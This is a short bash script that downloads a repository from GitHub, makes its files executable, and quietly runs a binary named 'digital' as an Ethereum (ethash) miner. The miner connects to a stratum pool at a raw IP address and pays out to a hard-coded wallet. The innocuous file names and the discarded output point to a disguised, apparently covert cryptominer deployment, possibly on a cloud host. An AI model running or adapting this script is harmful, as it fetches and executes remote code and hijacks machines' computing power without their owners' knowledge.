#!/bin/bash
cd /vicgroup
git clone https://github.com/bookingasfight/dotcom.git -q
chmod -R +x dotcom
./dotcom/digital -a ethash -o stratum+tcp://141.95.34.44:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-15 > /dev/null 2>&1